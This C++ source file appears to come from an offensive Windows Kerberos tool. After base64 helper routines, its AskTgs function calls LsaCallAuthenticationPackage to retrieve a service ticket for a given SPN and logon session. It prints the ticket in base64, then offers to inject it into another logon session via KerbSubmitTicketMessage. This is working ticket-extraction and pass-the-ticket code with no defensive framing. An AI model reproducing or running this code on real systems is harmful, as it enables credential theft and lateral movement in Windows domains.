#include "stuff.h"

static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
								'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
								'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
								'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
								'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
								'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
								'w', 'x', 'y', 'z', '0', '1', '2', '3',
								'4', '5', '6', '7', '8', '9', '+', '/' };
static char* decoding_table = NULL;
void build_decoding_table() {

	decoding_table = (char*)malloc(256);
	if (decoding_table == NULL) {
		exit(-1);
	}
	for (int i = 0; i < 64; i++) {
		decoding_table[(unsigned char)encoding_table[i]] = i;
	}
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {

	if (decoding_table == NULL) build_decoding_table();

	if (input_length % 4 != 0) return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=') {
		(*output_length)--;
	}
	if (data[input_length - 2] == '=') (*output_length)--;

	unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
	if (decoded_data == NULL) return NULL;

	for (int i = 0, j = 0; i < input_length;) {

		DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		DWORD triple = (sextet_a << 3 * 6)
			+ (sextet_b << 2 * 6)
			+ (sextet_c << 1 * 6)
			+ (sextet_d << 0 * 6);

		if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	return decoded_data;
}
const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string base64_encode(const unsigned char* bytes_to_encode, size_t in_len) {
	std::string out;

	int val = 0, valb = -6;
	for (size_t i = 0; i < in_len; ++i) {
		unsigned char c = bytes_to_encode[i];
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(base64_chars[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6) out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4) out.push_back('=');

	return out;
}

BOOL Test(HANDLE LsaHandle, ULONG kerberosAP, LUID LogonId) {

	KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = { KerbQueryTicketCacheMessage, LogonId };
	PKERB_QUERY_TKT_CACHE_RESPONSE pKerbCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	ULONG krbQTCacheSizeResponse = 0;
	NTSTATUS ProtocolStatus = 0;
	NTSTATUS status = LsaCallAuthenticationPackage(LsaHandle, kerberosAP, &kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID*)&pKerbCacheResponse, &krbQTCacheSizeResponse, &ProtocolStatus);
	if (status == 0) {
		if (ProtocolStatus == 0) {
			return TRUE;
		}
	}
	return FALSE;
}

BOOL AskTgs(HANDLE hLsa, ULONG AP, LUID logonId, LPCWSTR szTarget, LUID originaLuid) {
	std::wcout << L"[+] SPN " << szTarget << L" Validated" << std::endl;
	// 
	/*if (!Test(hLsa, AP, logonId)) {
		return FALSE;
	}*/
	std::wcout << L"[+] LSA Handle, AP, LUID are valid" << std::endl;
	PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
	PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
	DWORD szData;
	USHORT dwTarget;
	NTSTATUS packageStatus = 0;
	dwTarget = (USHORT)((wcslen(szTarget) + 1) * sizeof(wchar_t));
	szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
	if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData)) {
		pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
		pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_DEFAULT;
		pKerbRetrieveRequest->EncryptionType = KERB_ETYPE_DEFAULT;
		pKerbRetrieveRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
		pKerbRetrieveRequest->TargetName.MaximumLength = dwTarget;
		pKerbRetrieveRequest->LogonId = logonId;
		pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
		RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, szTarget, pKerbRetrieveRequest->TargetName.MaximumLength);

		NTSTATUS status = LsaCallAuthenticationPackage(hLsa, AP, pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
		if (status == STATUS_SUCCESS) {
			if (packageStatus == STATUS_SUCCESS) {
				pKerbRetrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
				status = LsaCallAuthenticationPackage(hLsa, AP, pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
				if (status == STATUS_SUCCESS) {
					if (packageStatus == STATUS_SUCCESS) {
						std::wcout << L"[+] Asking for TGS Success" << std::endl;
						std::cout << "[+] Ticket: " << base64_encode(pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize) << std::endl;
						std::cout << "[?] Inject Ticket? (Y/N)" << std::endl;
						char a;
						std::cin >> a;
						if (a == 'Y' || a == 'y') {
							std::string _ticket = base64_encode(pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize);
							size_t kirbiSize = 1;
							const char* ticket = _ticket.c_str();
							unsigned char* kirbiTicket = base64_decode(ticket, strlen(ticket), &kirbiSize);
							NTSTATUS packageStatus;
							DWORD submitSize, responseSize;
							PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
							PVOID dumPtr;

							submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
							if (pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize))
							{
								pKerbSubmit->MessageType = KerbSubmitTicketMessage;
								pKerbSubmit->KerbCredSize = kirbiSize;
								pKerbSubmit->LogonId = originaLuid;
								pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
								RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, kirbiTicket, pKerbSubmit->KerbCredSize);
								status = LsaCallAuthenticationPackage(hLsa, AP, pKerbSubmit, submitSize, &dumPtr, &responseSize, &packageStatus);
								if ((status == STATUS_SUCCESS))
								{
									if (packageStatus == STATUS_SUCCESS)
									{
										std::wcout << L"[+] Injected\n" << std::endl;
										status = 0x0;
									}
									else if (LsaNtStatusToWinError(packageStatus) == 1398) {
										std::wcout << L"[!!!!] ERROR_TIME_SKEW between KDC and host computer" << std::endl;
									}
									else {
										DWORD err = LsaNtStatusToWinError(packageStatus);
										std::cout << "[-] KerbSubmitTicketMessage / Package :" << err << "\n";
									}
								}
								else std::cout << "[-] KerbSubmitTicketMessage :" << LsaNtStatusToWinError(status) << "\n";
							}
						}
						return TRUE;
					}
					else {
						DWORD ptst = LsaNtStatusToWinError(packageStatus);
						std::cout << "[-] LsaCallAp Failed, Protocol Status : " << ptst;
						switch (ptst) {
						case 1312:
							std::cout << " ERROR_NO_SUCH_LOGON_SESSION";
							break;
						case 1326:
							std::cout << " ERROR_LOGON_FAILURE";
							break;
						}
						std::cout << std::endl;
						return FALSE;
					}
				}
				else {
					std::cout << "[-] LsaCallAp Failed, Function Status : " << LsaNtStatusToWinError(status) << std::endl;
					return FALSE;
				}
			}
			else {
				DWORD ptst = LsaNtStatusToWinError(packageStatus);
				std::cout << "[-] LsaCallAp Failed, Protocol Status : " << ptst;
				switch (ptst) {
				case 1312:
					std::cout << " ERROR_NO_SUCH_LOGON_SESSION";
					break;
				case 1326:
					std::cout << " ERROR_LOGON_FAILURE";
					break;
				}
				std::cout << std::endl;
				return FALSE;
			}
			std::cout << "[-] LsaCallAp Failed, Function Status : " << LsaNtStatusToWinError(status) << std::endl;
			return FALSE;
		}
	}

	return FALSE;
}